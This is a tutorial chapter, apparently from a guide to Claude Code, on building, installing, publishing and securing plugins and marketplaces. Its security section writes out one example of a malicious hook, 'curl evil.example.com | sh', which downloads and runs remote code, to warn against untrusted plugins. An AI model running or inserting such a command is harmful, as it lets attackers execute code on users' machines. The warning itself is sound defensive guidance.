Chapter 15

Plugins & the Marketplace Ecosystem

Bundle skills + hooks + subagents + MCP into one installable unit — and tap into the thousands already published

By now you've built skills (Chapter 6), hooks (Chapter 6), subagents (Chapter 14), and you may have wired up an MCP server or two. Each one of those lives in its own corner of .claude/ — useful for your project, easy to lose when you switch repos, awkward to share with a teammate beyond "copy these five files into your .claude/ directory and good luck."

Plugins fix that. A plugin is a single installable bundle that can ship skills, hooks, subagents, MCP servers, slash commands, LSP servers, background monitors, and even default settings. Install one with /plugin install; uninstall it just as cleanly. Publish your own to a marketplace; pull updates by bumping a version. The packaging story Claude Code was missing in 2025 is now a first-class feature, with thousands of community plugins already in the wild.

The packaging layer: standalone configs in .claude/ are great for personal experiments and one-off projects. The moment you want to share with your team, version your work, or pull in someone else's polished workflow — that's a plugin.

What's in a Plugin?

The Claude Code docs are explicit about what a plugin can bundle. Almost every customization mechanism you've learned in this book can ship inside one:

ComponentPlugin directoryWhat it adds
Manifest.claude-plugin/plugin.jsonRequired. Plugin name, description, version, author.
Skillsskills/Folders with SKILL.md files — namespaced as /plugin-name:skill-name.
Subagentsagents/Custom subagent definitions (same format as .claude/agents/).
Hookshooks/hooks.jsonLifecycle hooks. Same schema as settings.json hooks.
MCP servers.mcp.jsonExternal tool integrations (databases, GitHub, Sentry, …).
LSP servers.lsp.jsonLanguage server bindings for code intelligence.
Background monitorsmonitors/monitors.jsonLong-running watchers (log tailers, status pollers) that notify Claude as events arrive.
Bin scriptsbin/Executables added to the Bash tool's PATH while the plugin is enabled.
Default settingssettings.jsonCurrently agent and subagentStatusLine only. Activates a plugin agent as the main thread when enabled.

Common mistake: only plugin.json goes inside .claude-plugin/. Everything else (skills/, agents/, hooks/, .mcp.json, etc.) lives at the plugin root. Nest them inside .claude-plugin/ and they silently won't load.

Standalone vs Plugin: Which Do You Want?

The official guidance is pretty clean. Skills you keep iterating on personally? Standalone. Skills you want a teammate to install with one command and update with a git pull? Plugin.

Standalone (.claude/)

Quick to write, quick to change. Skills get short names like /deploy. Lives only in this project (or your home dir). Sharing means "copy these files." No versioning beyond git history of the host repo.

Plugin (.claude-plugin/plugin.json)

One /plugin install away for anyone. Skills are namespaced (/my-pack:deploy) so two plugins can't clash. Versioned via the manifest or git SHA. Reusable across every repo you open.

The Marketplace Universe

A marketplace is a catalog Claude Code can install plugins from. Three flavors are worth knowing:

  • Official Anthropic marketplace — claude-plugins-official, hosted at github.com/anthropics/claude-plugins-official. Auto-available the moment you launch Claude Code; no setup. Browseable in-app via /plugin or on the web at claude.com/plugins.
  • Community/curated marketplaces — buildwithclaude.com, claudemarketplaces.com, the awesome lists. You add these manually with /plugin marketplace add <source>.
  • Private enterprise marketplaces — teams behind Cowork ship internal-only plugins to authorized employees (more on this below).

There's also a separate demo marketplace called claude-code-plugins that Anthropic maintains for example plugins — you add it manually if you want to study patterns from working code.

What does the install flow actually look like? Here's a session installing an LSP plugin from the official marketplace:

/plugin
Plugin Manager — tabs: Discover | Installed | Marketplaces | Errors

Discover (claude-plugins-official)
  • typescript-lsp — Language server for TypeScript
  • python-lsp — Language server for Python
  • rust-lsp — Language server for Rust
  • code-quality — Lint, format, and review skills
  …
/plugin install typescript-lsp@claude-plugins-official

Loaded 1 LSP server (typescript), 2 skills (/typescript-lsp:find-refs, /typescript-lsp:rename-symbol).
Run /help to see them in your skill list.

That's the whole experience. One command, full TypeScript code intelligence and two new skills, available in every session you start in this project.

Installing & Managing Plugins

Plugin management lives behind one command: /plugin. It opens a tabbed interface for browsing, installing, updating, removing, and seeing load errors.

/plugin — opens the plugin manager UI. Tabs: Discover, Installed, Marketplaces, Errors. Cycle with Tab / Shift+Tab.

/plugin install <name>@<marketplace> — e.g., /plugin install code-quality@claude-plugins-official.

/plugin marketplace add <url-or-repo> — add a community or private marketplace.

/reload-plugins — hot-reload after editing a plugin file. No restart needed.

--plugin-dir ./path CLI flag — load a local plugin directory for testing without publishing.

Marketplace subcommands worth knowing

The /plugin marketplace subcommands cover the full marketplace lifecycle. Most teams need three of them:

CommandWhat it does
/plugin marketplace add <source>Add a marketplace. Source can be a git URL, a GitHub owner/repo shorthand, or a local path.
/plugin marketplace listList marketplaces this Claude Code session knows about.
/plugin marketplace refreshPull the latest manifests — do this after a teammate publishes a new plugin or version.
/plugin marketplace remove <name>Drop a marketplace. Plugins installed from it are not uninstalled automatically.

For team-wide setup, you can configure a marketplace at the repo level by adding it to .claude/settings.json — everyone who opens the project gets the same marketplace without typing anything.

Anatomy of a Plugin: a Walkthrough

Here's the smallest possible plugin — manifest plus one skill:

my-first-plugin/
├── .claude-plugin/
│   └── plugin.json
└── skills/
    └── hello/
        └── SKILL.md

The manifest is just JSON:

{
  "name": "my-first-plugin",
  "description": "A greeting plugin to learn the basics",
  "version": "1.0.0",
  "author": { "name": "Your Name" }
}

And the skill is a Markdown file with frontmatter:

---
description: Greet the user with a personalized message
---

# Hello Skill

Greet the user named "$ARGUMENTS" warmly and ask how you can help them today.

Test it locally without publishing anywhere:

$ claude --plugin-dir ./my-first-plugin
Loaded 1 plugin: my-first-plugin (v1.0.0)
1 skill registered: /my-first-plugin:hello
/my-first-plugin:hello Sara
Hi Sara! 👋 Great to have you here. What would you like to work on today?

That's the entire feedback loop — edit, /reload-plugins, try again. When you're ready to share, push to a git repo and have your teammate /plugin marketplace add <your-repo> followed by /plugin install my-first-plugin@<your-marketplace>. They'll pull updates from then on with /plugin marketplace refresh — no further manual sync needed.

Going Beyond Skills: the Full Bundle

A real-world plugin is rarely just one skill. The interesting plugins layer the primitives you already know. Below are typical patterns:

🌐
Language Pack
LSP server for the language + a code-reviewer subagent + a few language-specific skills + a hook that runs the linter on every save.
🚨
On-call Plugin
MCP server for PagerDuty + monitors that tail logs + skills like /incident-summary and /post-mortem.
🛡️
Security Pack
Security-reviewer subagent (read-only), PreToolUse hook that blocks risky commands, skills for OWASP categories, settings.json activates the reviewer as the main thread.
🎨
Design System Pack
Skills that know your component library, MCP server pointing at your tokens, a hook that auto-fixes inline styles, bin/ with your codegen CLI on PATH.

The settings.json trick is especially nice: ship a plugin whose settings.json sets "agent": "security-reviewer", and any project that enables the plugin runs the whole session as that subagent. One install, fully transformed environment.

Background monitors in a plugin

Background monitors are the least-known plugin feature and arguably the most useful for teams. A monitor is a long-running shell command whose stdout lines are delivered to Claude as notifications during the session — without you having to instruct the model to start watching.

Drop monitors/monitors.json at the plugin root:

[
  {
    "name": "error-log",
    "command": "tail -F ./logs/error.log",
    "description": "Application error log"
  },
  {
    "name": "ci-status",
    "command": "while true; do gh run list --limit 1 --json status,conclusion; sleep 60; done",
    "description": "Latest CI status, polled every 60s"
  }
]

When the plugin is enabled, Claude Code auto-starts each monitor at session start. New errors? CI just turned red? Claude sees the line as it arrives and can react proactively — "I notice your last test run failed; want me to look at the failure?"

Converting Standalone Configs to a Plugin

If you've already built up a .claude/ directory with skills, hooks, and subagents, the migration is mechanical:

  1. Create the manifest at my-plugin/.claude-plugin/plugin.json.
  2. Move .claude/commands/ → my-plugin/commands/ (or rename to skills/).
  3. Move .claude/agents/ → my-plugin/agents/.
  4. Move .claude/skills/ → my-plugin/skills/.
  5. If you had hooks in settings.json, copy the hooks block into my-plugin/hooks/hooks.json.
  6. Test with claude --plugin-dir ./my-plugin.

Once tested, delete the originals from .claude/ to avoid duplicates — the plugin version takes precedence either way, but cleanup keeps things clear.

Publishing & Distribution

You publish a plugin by putting it in a git repo and calling that repo a marketplace. Users add the marketplace, then install plugins from it — updates flow with a git pull.

Two versioning strategies:

  • Set a version field in plugin.json. Users get updates only when you bump it. Predictable, less noisy.
  • Omit the version field. The git commit SHA becomes the version — every commit counts as a new version. Simpler for fast-iterating projects but noisier for users.

To submit to the official Anthropic marketplace, use the in-app submission forms: claude.ai/settings/plugins/submit or platform.claude.com/plugins/submit. If you ship your own CLI tool, you can even prompt your users to install your plugin from inside it — see the docs on plugin hints.

Private Enterprise Marketplaces (Cowork)

On February 24, 2026, Anthropic shipped private plugin marketplaces alongside ten new department-specific plugins, twelve new MCP connectors, and a "Customize" admin control system. This is the enterprise story for plugins.

Enterprise admins build a private marketplace through the Customize menu in Cowork's admin settings. They can populate it with public Anthropic plugins, partner-built plugins, or custom ones — and back it with a private GitHub repo so the source code never leaves their infrastructure. Once plugins are in, admins control distribution three ways:

  • Per-user provisioning. Pick exactly which employees get which plugins.
  • Auto-install. Push specific plugins to specific teams without anyone clicking install.
  • Restricted visibility. Each team only sees the plugins relevant to their function (sales doesn't see the security pack; engineering doesn't see the SDR pack).

Anthropic also publishes knowledge-work-plugins — an open-source repo of department-tuned plugins teams can fork and adapt instead of starting from scratch.

For developers, the practical impact: even if you're not on Cowork, the same plugin format powers public and private marketplaces. Whatever you build on the open ecosystem will work inside an enterprise marketplace later, and vice versa. There's no separate "enterprise SDK" — just one plugin spec, multiple distribution channels.

Plugins vs Skills vs Hooks vs Subagents: Decision Framework

If you want to…Reach for…
Reuse a prompt template you keep typingSkill
Make something fire automatically on an eventHook
Run a specialist in its own context windowSubagent
Bundle and distribute several of the above as one unitPlugin
Pull in someone else's polished workflow with one commandPlugin (install)
Standardize a department or team's Claude experiencePlugin (private marketplace)

Plugins are the delivery mechanism; the other three are the payload. Most non-trivial Claude Code customizations end up as a plugin eventually — the only question is when.

The good news is that the conversion path is mechanical: anything you've built in .claude/ can become a plugin without rewriting a single line of logic. So default to standalone while you're iterating, and graduate to a plugin the moment you find yourself copy-pasting your .claude/ directory into a second project.

Security Considerations

  • Untrusted plugins can run arbitrary code. A plugin can ship a hook that runs curl evil.example.com | sh. Treat marketplaces like npm: official sources first, vet the code before installing community plugins, never auto-install from a stranger.
  • Plugin subagents have safety restrictions. By design, plugin subagents cannot set hooks, mcpServers, or permissionMode in their frontmatter — those fields are silently ignored. If you need them, copy the agent into your local .claude/agents/.
  • Audit trail in /plugin. The plugin manager shows every plugin's source, version, and what it ships. Spend ten seconds in the Errors tab before debugging anything else — many "Claude Code is broken" complaints are actually a misbehaving plugin.
  • Pin versions in shared environments. A team plugin without an explicit version field auto-updates on every commit. Pin it, or your "stable" review skill changes under your feet.
  • Review the diff on plugin updates. Especially for plugins shipping hooks or MCP servers — a manifest update is also a permission update. Treat plugin upgrades like dependency upgrades: read the changelog, scan the diff, then merge.
  • Use private marketplaces for sensitive workflows. Anything that touches credentials, internal endpoints, or proprietary code should ship through a private marketplace your team controls, not a public one anyone can fork or impersonate.

When Plugins Don't Load: Debugging Checklist

About 80% of "my plugin isn't working" reports trace back to one of three things. Run through these before reaching for anything fancier.

  1. Check the directory layout. Only plugin.json belongs inside .claude-plugin/. skills/, agents/, hooks/, .mcp.json, etc. all live at the plugin root, one level up. Nest them inside .claude-plugin/ and they're invisible to the loader.
  2. Check the Errors tab in /plugin. The plugin manager surfaces every load error with the offending file path. Many "Claude is broken" sessions are actually one bad JSON file in one plugin.
  3. Test components individually. If a plugin has skills, hooks, and a subagent, disable them one at a time (or comment out one section of the manifest) to isolate which piece is failing. The fastest debug loop is --plugin-dir + /reload-plugins on a stripped-down version.

If you're authoring against an installed marketplace plugin (you want to patch a community plugin without forking permanently), --plugin-dir with a same-named local copy overrides the marketplace version for that session. Edit, test, contribute the fix back upstream — without ever uninstalling.

Power Move: the --plugin-dir Iteration Loop

Develop plugins like you develop code: in a tight loop. The --plugin-dir flag loads a local directory as a plugin without publishing or installing anything. Pair it with /reload-plugins for hot reload after edits and you have a real authoring workflow:

$ claude --plugin-dir ./my-plugin --plugin-dir ./other-plugin

You can specify the flag multiple times to load several plugins together. If a local plugin shares a name with an installed marketplace plugin, the local copy wins for that session — perfect for testing patches against an installed plugin without uninstalling. Edit. /reload-plugins. Try it. Edit again. Ship when it works.

Bundle your favorite skill + hook + subagent into a plugin

Take one skill, one hook, and one subagent you've already built (or built in earlier exercises) and ship them as a single private plugin to your team.

  1. Create the plugin directory: 
    mkdir -p my-team-pack/.claude-plugin
echo '{"name": "my-team-pack", "description": "Our team standards", "version": "0.1.0"}' > my-team-pack/.claude-plugin/plugin.json
  2. Move your skill into my-team-pack/skills/<skill-name>/SKILL.md.
  3. Move your subagent into my-team-pack/agents/<agent-name>.md.
  4. Move your hook into my-team-pack/hooks/hooks.json (the format is identical to settings.json's hooks block).
  5. Test locally with claude --plugin-dir ./my-team-pack. Try the skill (/my-team-pack:<name>), check the agent appears in /agents, verify the hook fires.
  6. Push to a private git repo — that repo is now your team's private marketplace.
  7. Onboard a teammate: have them run /plugin marketplace add <your-repo> followed by /plugin install my-team-pack@<your-marketplace>.

Bonus: add an MCP server to .mcp.json so your team gets the same external integrations — pointing at your bug tracker, design system, or API gateway.
